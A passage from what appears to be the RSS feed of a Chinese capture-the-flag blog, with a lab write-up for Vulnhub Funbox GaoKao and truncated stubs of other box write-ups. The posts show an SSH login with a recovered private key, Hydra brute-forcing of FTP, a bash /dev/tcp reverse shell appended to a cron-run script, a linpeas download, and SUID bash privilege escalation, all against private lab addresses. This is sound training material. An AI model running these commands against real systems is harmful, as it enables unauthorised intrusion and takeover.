b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
```

拼接一下

```
┌──(kali㉿kali)-[~]
└─$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

改权限

```
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ ssh asahi@192.168.205.163 -i id_rsa
The authenticity of host '192.168.205.163 (192.168.205.163)' can't be established.
ED25519 key fingerprint is SHA256:y+2KKHDaMy8FmNZpu0PMG4PJ+b1w5rQQScGZYvJj4L8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.163' (ED25519) to the list of known hosts.

fuzzz:~$ id
uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)
fuzzz:~$ sudo -l
Matching Defaults entries for asahi on fuzzz:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asahi:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User asahi may run the following commands on fuzzz:
    (ALL) NOPASSWD: /usr/local/bin/lrz
```

lrz用于通过 ZMODEM/YMODEM/XMODEM 协议接收文件

然后看帮助文档

```
-C, --allow-remote-commands allow execution of remote commands (Z)
```

这个选项的字面意思就是“**允许执行远程命令**”。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Fuzzz.html</guid><pubDate>Wed, 02 Jul 2025 01:34:51 +0000</pubDate></item><item><title>内部_Leak</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Leak.html</link><description>## 靶机信息

- **IP 地址:** `192.168.205.161`
- **攻击机:** `192.168.205.128`

---

## 一、信息收集与服务枚举

首先，对目标主机进行全端口 TCP 扫描，以确定开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Leak.html</guid><pubDate>Tue, 01 Jul 2025 11:09:43 +0000</pubDate></item><item><title>内部_yulian</title><link>https://7r1UMPHK.github.io/post/nei-bu-_yulian.html</link><description>![image-20250627200158237](https://7r1umphk.github.io/image/image20250627200158372.webp)

群内靶机

开搞

## 一、信息收集与发现

渗透测试的第一步永远是信息收集。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_yulian.html</guid><pubDate>Sat, 28 Jun 2025 02:20:14 +0000</pubDate></item><item><title>说点事</title><link>https://7r1UMPHK.github.io/post/shuo-dian-shi.html</link><description>事情经过就是我电脑有问题刷了系统，然后我github和google都开了二步，全部没了，so
7r1umph是我，7r1umphk也是我
以后发布就发在这了，然后hmv和thl平台应该会创一个新号名字是7r1umphk
当然如果旧博客有的wp我不会交了
就说这么多。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shuo-dian-shi.html</guid><pubDate>Fri, 27 Jun 2025 09:34:16 +0000</pubDate></item><item><title>内部_Qingmei</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Qingmei.html</link><description>## 1. 信息收集

### 1.1 主机发现

使用 `arp-scan` 工具对本地网络 `192.168.205.0/24` 进行扫描，以识别目标主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Qingmei.html</guid><pubDate>Fri, 27 Jun 2025 09:34:11 +0000</pubDate></item><item><title>✨ 焕然一新：我的博客界面美化之旅 ✨</title><link>https://7r1UMPHK.github.io/post/%E2%9C%A8%20-huan-ran-yi-xin-%EF%BC%9A-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv-%20%E2%9C%A8.html</link><description>大家好！

最近如果你经常访问我的博客，可能会发现它悄悄地“变脸”了！没错，在过去的一段时间里，我投入了不少精力对博客的前端界面进行了一次比较全面的美化和升级。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/%E2%9C%A8%20-huan-ran-yi-xin-%EF%BC%9A-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv-%20%E2%9C%A8.html</guid><pubDate>Fri, 27 Jun 2025 09:34:09 +0000</pubDate></item><item><title>vulnhub_Funbox_ GaoKao</title><link>https://7r1UMPHK.github.io/post/vulnhub_Funbox_%20GaoKao.html</link><description># vulnhub_Funbox: GaoKao

# 0.简介

**靶机**：https://vulnhub.com/entry/funbox-gaokao,707/  
**难度**：绿色  
**目标 IP**：192.168.205.152  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 17:56 CST
Nmap scan report for 192.168.205.152
Host is up (0.00025s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)
|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)
|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wellcome to Funbox: Gaokao !
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate
| Not valid before: 2021-06-05T15:15:30
|_Not valid after:  2031-06-03T15:15:30
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.34-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, IgnoreSpaceBeforeParenthesis, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, IgnoreSigpipes, SupportsLoadDataLocal, SupportsCompression, ODBCClient, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: w5w-\x05[lh(@\x08Zp*'=C:\x01\x10
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:84:89:FF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.205.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
                                      
```

Gaokao可能是一个用户

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.205.128 !
230-
230-The local time is: Sun Feb 09 09:57:05 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to &lt;sky@funbox9&gt;.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||13045|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 .
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 ..
-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
226 Transfer complete
ftp&gt; mget welcome.msg
mget welcome.msg [anpqy?]? y                                                                                                         
229 Entering Extended Passive Mode (|||48839|)
150 Opening BINARY mode data connection for welcome.msg (169 bytes)
100% |******************************************************************************************|   169        5.55 MiB/s    00:00 ETA
226 Transfer complete
169 bytes received in 00:00 (150.30 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat welcome.msg 
Welcome, archive user %U@%R !

The local time is: %T

This is an experimental FTP server.  If you have any unusual problems,
please report them via e-mail to &lt;sky@%L&gt;.

                
```

sky可能是一个用户，继续

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.152 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.152
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10310]
/.                    (Status: 200) [Size: 10310]

```

就一个默认页，页面无隐藏，爆破ssh,ftp（mysql，要是真没有再说）

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.152 -V -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ssh://192.168.205.152:22/

```

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ftp://192.168.205.152 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:04
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ftp://192.168.205.152:21/

[21][ftp] host: 192.168.205.152   login: sky   password: thebest
[STATUS] attack finished for 192.168.205.152 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-09 18:02:53

```

ftp有结果，上去看看

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||39399|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp&gt; mget *
mget user.flag [anpqy?]? y
229 Entering Extended Passive Mode (|||51733|)
150 Opening BINARY mode data connection for user.flag (66 bytes)
100% |******************************************************************************************|    66        1.65 MiB/s    00:00 ETA
226 Transfer complete
66 bytes received in 00:00 (41.31 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat user.flag 
#!/bin/sh
echo 'Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd'
              
```

有个脚本，有点像后台脚本，我们加个shell上去试试

```
┌──(kali㉿kali)-[~/test]
└─$ echo 'bash -i &gt;&amp;/dev/tcp/192.168.205.128/8888 0&gt;&amp;1' &gt;&gt; user.flag
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||24304|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp&gt; put user.flag 
local: user.flag remote: user.flag
229 Entering Extended Passive Mode (|||53542|)
150 Opening BINARY mode data connection for user.flag
100% |******************************************************************************************|   111        2.35 MiB/s    00:00 ETA
226 Transfer complete
111 bytes sent in 00:00 (117.56 KiB/s)

```

另外窗口监测

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 52670
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
bash-4.4$ sudo -l
[sudo] password for sarah: 
bash-4.4$ ls -al
total 36
dr-xr-xr-x 4 sarah sarah 4096 Jun  6  2021 .
drwxr-xr-x 5 root  root  4096 Jun  5  2021 ..
-r--r--r-- 1 sarah sarah  220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sarah sarah 3771 Jun  5  2021 .bashrc
dr-x------ 2 sarah sarah 4096 Jun  5  2021 .cache
dr-x------ 3 sarah sarah 4096 Jun  5  2021 .gnupg
-r--r--r-- 1 sarah sarah  807 Jun  5  2021 .profile
-r--rw-r-- 1 sarah sarah   74 Jun  5  2021 .selected_editor
-r-------- 1 sarah sarah 3214 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -la
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd lucy/
bash-4.4$ ls -al
total 36
drwxr-xr-x 4 lucy lucy 4096 Jun  6  2021 .
drwxr-xr-x 5 root root 4096 Jun  5  2021 ..
-rw------- 1 lucy lucy  192 Jun  6  2021 .bash_history                                                                               
-rw-r--r-- 1 lucy lucy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 lucy lucy 3771 Apr  4  2018 .bashrc
drwx------ 2 lucy lucy 4096 Jun  5  2021 .cache
drwx------ 3 lucy lucy 4096 Jun  5  2021 .gnupg
-rw-r--r-- 1 lucy lucy  807 Apr  4  2018 .profile
-rw-r--r-- 1 lucy lucy    0 Jun  5  2021 .sudo_as_admin_successful
-rw------- 1 lucy lucy  702 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd sky/
bash-4.4$ ls -al
total 36
drwxr-xr-x 3 sky  sky   4096 Jun  6  2021 .
drwxr-xr-x 5 root root  4096 Jun  5  2021 ..
-rw------- 1 sky  sky     56 Jun  5  2021 .bash_history
-r--r--r-- 1 sky  sky    220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sky  sky   3771 Jun  5  2021 .bashrc
-r--r--r-- 1 sky  sky    807 Jun  5  2021 .profile
drwxr----- 2 root root  4096 Jun  5  2021 .ssh
-rwxr-x--- 1 sky  sarah  111 Feb  9 10:04 user.flag
-rw------- 1 sky  sky   1489 Jun  5  2021 .viminfo
bash-4.4$ find / -perm -4000 -type f 2&gt;/dev/null
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

传脚本（其实是我靶机抽风了，少了个bash）

```
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:54--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... failed: Connection refused.
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:59--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================&gt;] 820.08K  --.-KB/s    in 0.003s  

2025-02-09 10:08:59 (269 MB/s) - ‘linpeas.sh’ saved [839766/839766]

bash-4.4$ chmod +x linpeas.sh 
bash-4.4$ bash linpeas.sh 
```

也没有，重装吧

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
id
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 48504
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)
bash-4.4$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/bin/bash
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

bash -p

```
bash-4.4$ bash -p
bash -p
id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)

```。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnhub_Funbox_%20GaoKao.html</guid><pubDate>Fri, 27 Jun 2025 09:34:06 +0000</pubDate></item><item><title>thl_THLCPPT_V16笔记</title><link>https://7r1UMPHK.github.io/post/thl_THLCPPT_V16-bi-ji.html</link><description># thl_THLCPPT_V16笔记

**靶机**：https://thehackerslabs.com/thlcpptv16/

**难度**：专家（EXPERTO）

**目标 IP**：192.168.205.152
**本机 IP**：192.168.205.141

# 1.端口枚举及服务探测

使用 `nmap` 扫描目标 IP 的开放端口：

```
nmap 192.168.205.152
```

![image](https://github.com/user-attachments/assets/c9e617e5-96af-47a7-832e-7ea63715d9d6)

访问 80 端口

![image](https://github.com/user-attachments/assets/b8625cb6-3e5c-483b-aa82-6ccbfc550f2a)

点击 Ir al Examen 发现子域，分别为：

1. examen.thlcpptv16.thl
2. thlcpptv16.thl

将这两个域名添加到 `/etc/hosts` 文件中，进一步探查。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_THLCPPT_V16-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:34:01 +0000</pubDate></item><item><title>thl_sinplomo98笔记</title><link>https://7r1UMPHK.github.io/post/thl_sinplomo98-bi-ji.html</link><description># thl_sinplomo98笔记

**靶机**：https://thehackerslabs.com/sinplomo98/
**难度**：高级（AVANZADO）
**攻击ip**:192.168.205.141
**靶机ip**:192.168.205.157

# 1.端口扫描

首先使用`nmap`扫描目标机器的开放端口：

```
nmap 192.168.205.157
```

![image](https://github.com/user-attachments/assets/35d20d5f-2eb5-461b-a2aa-e2ff6bcdff3f)

通过扫描，发现目标机器上开放了多个端口，其中21端口（FTP服务）和5000端口（Web服务）我比较感兴趣。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_sinplomo98-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:33:59 +0000</pubDate></item><item><title>thl_Offensive</title><link>https://7r1UMPHK.github.io/post/thl_Offensive.html</link><description># thl_Offensive

**靶机**：[thehackerslabs - offensive](https://thehackerslabs.com/offensive/)
**难度**：专业（PROFESIONAL）
**目标 IP**：192.168.205.220
**本机 IP**：192.168.205.141

---

## 1. 端口枚举及服务探测

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.220
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 11:32 CST
Nmap scan report for 192.168.205.220
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Node.js Express framework
MAC Address: 08:00:27:B1:A8:86 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
```

从 `nmap` 扫描结果来看，目标机器开放了 **22** (SSH) 、 **80** (HTTP) 端口、**8080**(HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_Offensive.html</guid><pubDate>Fri, 27 Jun 2025 09:33:56 +0000</pubDate></item><item><title>thl_ensala-papas</title><link>https://7r1UMPHK.github.io/post/thl_ensala-papas.html</link><description># thl_ensala-papas

# 0.简介

**靶机**：[thehackerslabs - ensala-papas](https://thehackerslabs.com/ensala-papas/)
**难度**：初学者
**目标 IP**：192.168.205.221
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST
Nmap scan report for 192.168.205.221
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3167/tcp  filtered nowcontact
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
                                                                   
```

再探测详细服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST
Nmap scan report for 192.168.205.221
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.00 seconds
                                                                
```

探测UDP服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST
Nmap scan report for 192.168.205.221
Host is up (0.00048s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 69.21 seconds
```

使用`nmap`扫描漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST
Nmap scan report for 192.168.205.221
Host is up (0.00056s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Host script results:
